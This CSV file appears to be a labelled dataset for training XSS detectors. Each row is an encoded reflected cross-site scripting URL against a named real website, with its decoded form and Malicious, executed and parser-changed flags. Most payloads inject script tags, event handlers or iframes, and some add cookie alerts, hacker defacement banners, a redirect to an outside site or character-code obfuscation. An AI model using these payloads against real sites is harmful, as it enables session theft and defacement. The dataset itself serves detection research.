Payloads,Class,decoded,executed,parser_changed
http://www.varta-automotive.nl/index.php?id=53&amp;q=%22/%3e%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;x=<br>0&amp;y=0#,Malicious,"http://www.varta-automotive.nl/index.php?id=53&q=""/><script>alert(""xss"")</script>&x=0&y=0#",True,True
http://www.arcade-immobilier.com/index.php?lang=fr/&quot;&gt;&lt;script&gt;alert('xss by atm0n3r')&lt;/script&gt;,Malicious,"http://www.arcade-immobilier.com/index.php?lang=fr/""><script>alert('xss by atm0n3r')</script>",True,True
"http://www.saab.co.za/servlet/saabmail?attch1=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious,"http://www.saab.co.za/servlet/saabmail?attch1=>""><script 
>alert(/xss by turkpower/);</script><h1>xss by turkpower</h1></marquee>",True,True
http://fotoboek.daalmans.com/igallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://fotoboek.daalmans.com/igallery/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://travel.state.mt.us/categories/primary.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;<br>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious,"http://travel.state.mt.us/categories/primary.asp?title=<script>alert(""scriptorium(turkey)"")</script><meta http-equiv=""refresh"" content=""0;url=http://www.canixim.com"">",True,True
http://ready.mobi/error.jsp?url=http://&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;could not retrieve page content<br>for http://&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://ready.mobi/error.jsp?url=http://""><script>alert(1);</script>could not retrieve page contentfor http://""><script>alert(1);</script>",True,True
http://bvs.minsa.gob.pe/php/bvsnet.php?lang=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/script&gt;,Malicious,"http://bvs.minsa.gob.pe/php/bvsnet.php?lang=""><script>alert(/ar3sw0rmed/);</script>",True,True
http://communicate.aag.org/eseries/aag_org/program/searchkeywords.cfm?keyword=%22%3e%3cscript%3ealer<br>t(0)%3c/script%3e,Malicious,"http://communicate.aag.org/eseries/aag_org/program/searchkeywords.cfm?keyword=""><script>alert(0)</script>",True,True
http://img89.imageshack.us/i/script1ge8.png%22%20/%3e%3cimg%20src=k%20onerror=alert%281%29%20/%3e,Malicious,"http://img89.imageshack.us/i/script1ge8.png"" /><img src=k onerror=alert(1) />",True,True
http://strtc.oracle.com/imtapp/console/cns_download.jsp?file=%22%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e,Malicious,"http://strtc.oracle.com/imtapp/console/cns_download.jsp?file=""><script>alert(document.cookie)</script>",True,True
http://www.g4s.com/se-search_results.htm?col=sec&amp;la=en&amp;charset=charset%3diso-8859-1&amp;st=1&amp;nh=5&amp;ql=a&amp;q<br>t=%3cscript%3ealert(/g4s=security%20company?/);alert(/dont%20think%20so.../)%3c%2fscript%3e%3ciframe<br>%20src=%22http://www.google.com%22/%3e&amp;search-submit.x=0&amp;search-submit.y=0&amp;search-submit=go,Malicious,"http://www.g4s.com/se-search_results.htm?col=sec&la=en&charset=charset=iso-8859-1&st=1&nh=5&ql=a&qt=<script>alert(/g4s=security company?/);alert(/dont think so.../)</script><iframe src=""http://www.google.com""/>&search-submit.x=0&search-submit.y=0&search-submit=go",True,True
http://tusca.ut.ac.ir/gallery/viewgallery.asp?id=93&amp;num=%22%20%22/%3e%3cscript%3ealert%28/securityla<br>b.ir/%29%3c/script%3e%20bad%3d%22&amp;tot=8,Malicious,"http://tusca.ut.ac.ir/gallery/viewgallery.asp?id=93&num="" ""/><script>alert(/securitylab.ir/)</script> bad=""&tot=8",True,True
http://jacksonmiller.com/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://jacksonmiller.com/login.asp?folder=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://www.fureai.or.jp/~peipei/blog/index.cgi/help/%22%3e'%3e%3ciframe%20src=javascript:alert('xss'<br>);%3e%3c/iframe%3e,Malicious,"http://www.fureai.or.jp/~peipei/blog/index.cgi/help/"">'><iframe src=javascript:alert('xss');></iframe>",True,True
http://ccaronsewa.com/newsdetail.php?id=%22%3e%3c/title%3e%3cscript%3ealert%281%29%3c/script%3e,Malicious,"http://ccaronsewa.com/newsdetail.php?id=""></title><script>alert(1)</script>",True,True
http://www.shssh.gov.al/subindex.php?faqe=news&amp;id=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.shssh.gov.al/subindex.php?faqe=news&id='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.logitech.com/en-za/support-downloads?modelsearch=yes&amp;modelnumber=%22/%3e%3cscript%3ealert<br>%28%22xss%3a+vijayendra%22%29%3c/script%3e,Malicious,"http://www.logitech.com/en-za/support-downloads?modelsearch=yes&modelnumber=""/><script>alert(""xss: vijayendra"")</script>",True,True
http://pomoc.krstarica.com/?action=category&amp;cat_id=2%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,Malicious,"http://pomoc.krstarica.com/?action=category&cat_id=2""><script>alert(document.cookie)</script>",True,True
http://www.relius.net/products/ads_modules.asp?t=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.relius.net/products/ads_modules.asp?t=""><script>alert(""maxwel"")</script>",True,True
http://www.maitri.us/maitri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by<br>%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.maitri.us/maitri/igallery.asp?d=""><script>alert(document.cookie)</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://planetsourcecode.com/vb/timeout/sessiontimeout.asp?txtreturnurl=/vb/scripts/browsecategoryors<br>earchresults.asp&amp;txtparms=txtcriteria=%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22<br>%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/scr<br>ipt%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.co<br>okie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert<br>(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3csc<br>ript%3ealert(document.cookie)%3c/script%3e%3c%22%3c%3cscript%3ealert(1337)%3c/script%3e,Malicious,"http://planetsourcecode.com/vb/timeout/sessiontimeout.asp?txtreturnurl=/vb/scripts/browsecategoryorsearchresults.asp&txtparms=txtcriteria=<""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(document.cookie)</script><""<<script>alert(1337)</script>",True,True
http://www.katholisches-bildungsforum.de/meng/meng/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.katholisches-bildungsforum.de/meng/meng/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.lf.gov.cn/pub/sysmb/search.asp?keyword=%3cscript%3ealert%28document.cookie%29%3c/script%3<br>e,Malicious,http://www.lf.gov.cn/pub/sysmb/search.asp?keyword=<script>alert(document.cookie)</script>,True,True
http://www.london.edu/search/search.html?qt=%22%3e%3cscript%3ealert(%2fkiller-tr%2f)%3c%2fscript%3e&amp;<br>x=0&amp;y=0,Malicious,"http://www.london.edu/search/search.html?qt=""><script>alert(/killer-tr/)</script>&x=0&y=0",True,True
http://newweb.syups.tp.edu.tw/mailto.asp?mailto=egg20176@yahoo.com.tw%27%22%3e%3c/title%3e%3cscript%<br>3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://newweb.syups.tp.edu.tw/mailto.asp?mailto=egg20176@yahoo.com.tw'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.turkbirligi.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.turkbirligi.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://vikingscards.com/guestbook/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://vikingscards.com/guestbook/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.fondant.pe.kr/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%<br>69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%3<br>1%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35<br>%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://www.fondant.pe.kr/tt/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://www.tavla06.com/forum/philboard_search.asp?searchterms=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&lt;h1&gt;www.raptr.us.tc&lt;/h1&gt;,Malicious,"http://www.tavla06.com/forum/philboard_search.asp?searchterms=""><script>alert(document.cookie)</script><h1>www.raptr.us.tc</h1>",True,True
http://medical-dictionary.thefreedictionary.com/%22%3b%3c%2fscript%3e%3cscript%3ealert(document.cook<br>ie)%3b%3c%2fscript%3e,Malicious,"http://medical-dictionary.thefreedictionary.com/"";</script><script>alert(document.cookie);</script>",True,True
http://www.getacoder.com/projects/home_page_subcategories_0.htm?t=%22%3e%3cscript%3ealert(123)%3c/sc<br>ript%3e&amp;b=0,Malicious,"http://www.getacoder.com/projects/home_page_subcategories_0.htm?t=""><script>alert(123)</script>&b=0",True,True
http://www.oncfs.gouv.fr/spip.php?page=recherche&amp;recherche=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious,"http://www.oncfs.gouv.fr/spip.php?page=recherche&recherche=/""><script>alert('xss byatm0n3r')</script>",True,True
http://www.jsecode.com/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e<br>&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious,"http://www.jsecode.com/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=xss&submit=����",True,True
http://www.americanexpress.com/uk/nectar/default.shtml?pid=827&amp;buid=ccg&amp;psku=mut&amp;affid=1301290&amp;crtv=<br>&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious,"http://www.americanexpress.com/uk/nectar/default.shtml?pid=827&buid=ccg&psku=mut&affid=1301290&crtv=""><script>alert('trex')</script>",True,True
http://elections.utah.gov/voterregistrationnewhow.html=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious,"http://elections.utah.gov/voterregistrationnewhow.html=><script>alert(""xss"")</script>",True,True
http://tv.detik.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://tv.detik.com/index.php?fa=""><script>alert(/xss/)</script>",True,True
http://zonealarm.com/store/content/company/aboutus/aboutus.jsp?dc=34std&amp;ctry=%22%3e%27%3e%3c%73%63%7<br>2%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c<br>%31%32%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%<br>35%2c%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;lang=ja,Malicious,"http://zonealarm.com/store/content/company/aboutus/aboutus.jsp?dc=34std&ctry="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&lang=ja",True,True
http://nonki.ffvv.net/diary/2007/%3c/title%3e%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e/,Malicious,"http://nonki.ffvv.net/diary/2007/</title>"">'><script>alert('xss')</script>/",True,True
http://www.cdgs.gov.cn/sysmb/search.asp?keyword=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scri<br>pt%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.cdgs.gov.cn/sysmb/search.asp?keyword='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://chessguide.com/dir/s.asp?l=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://chessguide.com/dir/s.asp?l=""><script>alert(""maxwel"")</script>",True,True
http://phponlyscripts.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious,http://phponlyscripts.com/signinform.php?msg=<script>alert(/xssed/)</script>,True,True
http://search.ce.cn/ced/search.jsp?defaultsearchcolumns=&amp;searchword=%27%27%3b%21--%22%3cscript%3eale<br>rt%280%29%3b%3c%2fscript%3e%3d%26%7b%28alert%281%29%29%7d&amp;channelid=79132&amp;newtitle=&amp;source=&amp;start=20<br>07-10-13&amp;resultshow=-1&amp;seltype=1&amp;selchannel=-1&amp;sortfield=,Malicious,"http://search.ce.cn/ced/search.jsp?defaultsearchcolumns=&searchword='';!--""<script>alert(0);</script>=&{(alert(1))}&channelid=79132&newtitle=&source=&start=2007-10-13&resultshow=-1&seltype=1&selchannel=-1&sortfield=",True,True
http://www.radware.co.il/content/events/campaigns/default.asp?_t=&amp;leadsrc=%22%3e%3cscript%3ealert(do<br>cument.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.radware.co.il/content/events/campaigns/default.asp?_t=&leadsrc=""><script>alert(document.cookie)</script>><marquee><h1>meloulisi</h1></marquee>",True,True
http://suche.sueddeutsche.de/?source=sde&amp;radiosearch=archiv&amp;q=%3cscript%3ealert%28%22xss%22%29%3c%2f<br>script%3e&amp;x=17&amp;y=10,Malicious,"http://suche.sueddeutsche.de/?source=sde&radiosearch=archiv&q=<script>alert(""xss"")</script>&x=17&y=10",True,True
http://www.bankisrael.gov.il/press/pressheb.php?year=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.bankisrael.gov.il/press/pressheb.php?year=""><script>alert(1);</script>",True,True
https://www.revisor.mn.gov/revisor/pages/search_status/status_detail.php?b=house&amp;f=hf1362&amp;ssn=0&amp;y=%2<br>2%3e%3cscript%3ealert%28%27hey%20you%27%29%3c/script%3e,Malicious,"https://www.revisor.mn.gov/revisor/pages/search_status/status_detail.php?b=house&f=hf1362&ssn=0&y=""><script>alert('hey you')</script>",True,True
http://img269.imageshack.us/slideshow/webplayer.php?id=%3cscript%3ealert%281337%29;%3c/script%3e,Malicious,http://img269.imageshack.us/slideshow/webplayer.php?id=<script>alert(1337);</script>,True,True
http://s.readmej.com/search.cgi?title=on&amp;comment=on&amp;genre=on&amp;key=%22%3e%27%3e%3c%73%63%72%69%70%74%3<br>e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c<br>%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%<br>31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious,"http://s.readmej.com/search.cgi?title=on&comment=on&genre=on&key="">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
",True,True
http://www.ita-aites.org/redirection/?url=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.ita-aites.org/redirection/?url=""><script>alert(""maxwel"")</script>",True,True
http://www.millingtontn.gov/cgi-bin/ksearch/ksearch.cgi?p=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.millingtontn.gov/cgi-bin/ksearch/ksearch.cgi?p=""><script>alert(document.cookie)</script>",True,True
http://www.funponsel.com/blog/index.php?s=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscrip<br>t%3e&amp;submit=search,Malicious,"http://www.funponsel.com/blog/index.php?s=""><script>alert(document.cookie);</script>&submit=search",True,True
http://cleveland.indians.mlb.com/media/video.jsp?mid=%3cscript&gt;alert('pappy%20was%20here');&lt;/script&gt;,Malicious,http://cleveland.indians.mlb.com/media/video.jsp?mid=<script>alert('pappy was here');</script>,True,True
http://www.bluenity.fr/?frml=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.bluenity.fr/?frml=""></a><script>alert(1);</script>",True,True
https://ebs.swf.usace.army.mil/ebs/solicitationview.cfm?id=1128&amp;seldist=%22%3e%3cscript%3ealert('sey<br>menwashere security holes are here')%3c/script%3e,Malicious,"https://ebs.swf.usace.army.mil/ebs/solicitationview.cfm?id=1128&seldist=""><script>alert('seymenwashere security holes are here')</script>",True,True
http://www.wdav.org/nav1024.cfm?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.wdav.org/nav1024.cfm?cat=""><script>alert(""maxwel"")</script>",True,True
http://www.hotspringsfsbos.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.hotspringsfsbos.com/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://udon.be/test/read.cgi?q=%22%3e%27%3e%3cscript%3ealert%28%27xss%27%29%3c%2fscript%3e&amp;bbs=rainb<br>ow&amp;key=1180754636,Malicious,"http://udon.be/test/read.cgi?q="">'><script>alert('xss')</script>&bbs=rainbow&key=1180754636",True,True
http://www.qualitynet.org/dcs/contentserver?pagename=qnetpublic/search/searchresults&amp;keywords='&quot;&gt;&lt;sc<br>ript&gt;alert('xss');&lt;/script&gt;,Malicious,"http://www.qualitynet.org/dcs/contentserver?pagename=qnetpublic/search/searchresults&keywords='""><script>alert('xss');</script>",True,True
http://www.interdys.org/search.aspx?search=%22%3e%3cscript%3ealert(%22i%20can%20read!!!!!!%22)%3c%2f<br>script%3e&amp;image.x=0&amp;image.y=0,Malicious,"http://www.interdys.org/search.aspx?search=""><script>alert(""i can read!!!!!!"")</script>&image.x=0&image.y=0",True,True
<script/%00%00v%00%00>alert(/renwax23/)</script>,Malicious,<script/,True,True
http://bond.unleashedinformatics.com/index.jsp?pg=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://bond.unleashedinformatics.com/index.jsp?pg=""><script>alert(""maxwel"")</script>",True,True
http://www.powderandbulk.com/cgi-bin/cspoller/cspoller.cgi?cid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.powderandbulk.com/cgi-bin/cspoller/cspoller.cgi?cid=""><script>alert(""maxwel"")</script>",True,True
http://80.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://80.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.bizportal.co.il/shukhahon/biznews02.shtml?mid=%22%3e%3cscript%3ealert(document.cookie)%3c<br>/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.bizportal.co.il/shukhahon/biznews02.shtml?mid=""><script>alert(document.cookie)</script>><marquee><h1>meloulisi</h1></marquee>",True,True
https://store.adobe.com/cgi-bin/webobjects/wec.woa/19;&lt;script&gt;alert(123)&lt;/script&gt;/wo/otjm3o1ebtibadrhcz2kiw/10.14,Malicious,https://store.adobe.com/cgi-bin/webobjects/wec.woa/19;<script>alert(123)</script>/wo/otjm3o1ebtibadrhcz2kiw/10.14,True,True
http://www.lottomaticaitalia.it/arearicevitori/pub/giochi/?p=foglia_giochi_1&amp;sezione=pub&amp;sottosezion<br>e=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,"http://www.lottomaticaitalia.it/arearicevitori/pub/giochi/?p=foglia_giochi_1&sezione=pub&sottosezione=""><script>alert('xss')</script>",True,True
http://www.redbullusa.com/en/search/htmlsearch.action?keyword=test&quot;%3e%3cscript%3ealert('s0m.ph')%3c<br>%2fscript%3e&amp;x=0&amp;y=0,Malicious,"http://www.redbullusa.com/en/search/htmlsearch.action?keyword=test""><script>alert('s0m.ph')</script>&x=0&y=0",True,True
http://thesimpsonsshop.resultspage.com/search?sessid=e8e97c4d64adfb8251eba7e7aa0ffa89&amp;p=q&amp;ts=custom&amp;<br>w=%22%3e%3c%2ftitle%3e%3c%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+%22onmouseover%3d%22ale<br>rt%281%29%22+onmouseover%3dalert%281%29&amp;x=14&amp;y=7,Malicious,"http://thesimpsonsshop.resultspage.com/search?sessid=e8e97c4d64adfb8251eba7e7aa0ffa89&p=q&ts=custom&w=""></title></script><script>alert(1)</script> ""onmouseover=""alert(1)"" onmouseover=alert(1)&x=14&y=7",True,True
http://cyber-mirror.org/mass-add/?d=8%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious,"http://cyber-mirror.org/mass-add/?d=8""><script>alert(document.cookie)</script>",True,True
http://www.annuairedesentreprisesadie.org/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.annuairedesentreprisesadie.org/signinform.php?msg=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.tajomi.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;<br>/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.tajomi.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.fedhorecavlaanderen.be/homepage.asp?id=1&amp;menu_key=%22%3e%3cscript%3ealert(%22maxwel%22)%3<br>c/script%3e,Malicious,"http://www.fedhorecavlaanderen.be/homepage.asp?id=1&menu_key=""><script>alert(""maxwel"")</script>",True,True
http://search.rediff.com/imgsrch/default.php?mt=dalai%20lama&amp;start=&amp;perpage=6&amp;page=1&amp;filter=0&amp;imgsiz<br>e=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e,Malicious,"http://search.rediff.com/imgsrch/default.php?mt=dalai lama&start=&perpage=6&page=1&filter=0&imgsize=""><script>alert(document.cookie)</script>",True,True
http://www.ntnu.no/kunnskapskalenderen/xinha/plugins/forms/popups/textarea.html%22%3e%3cscript%3eale<br>rt(document.cookie)%3c/script%3e,Malicious,"http://www.ntnu.no/kunnskapskalenderen/xinha/plugins/forms/popups/textarea.html""><script>alert(document.cookie)</script>",True,True
http://www.mkeh.gov.hu/kereses?keywords=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.domain)%3b%3c/s<br>cript%3e,Malicious,"http://www.mkeh.gov.hu/kereses?keywords=>""><script 
>alert(document.domain);</script>",True,True
http://www.zhangshiji.com/search.asp?field=title&amp;bigclassname=%3cscript%3ealert(%22xss%22)%3c/script<br>%3e&amp;smallclassname=&amp;keyword=xss&amp;submit=%cb%d1%cb%f7,Malicious,"http://www.zhangshiji.com/search.asp?field=title&bigclassname=<script>alert(""xss"")</script>&smallclassname=&keyword=xss&submit=����",True,True
http://www.forestrights.gov.in/committeereport/report.jsp?cl=1&amp;&amp;drpdistrict=89&amp;&amp;page=1&quot;&gt;&gt;&lt;/script&gt;&lt;s<br>cript&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://www.forestrights.gov.in/committeereport/report.jsp?cl=1&&drpdistrict=89&&page=1"">></script><script>alert(document.cookie)</script>",True,True
http://www.usmint.gov/index.cfm?flash='&quot;&gt;&lt;script&gt;alert('xss');&lt;/script&gt;,Malicious,"http://www.usmint.gov/index.cfm?flash='""><script>alert('xss');</script>",True,True
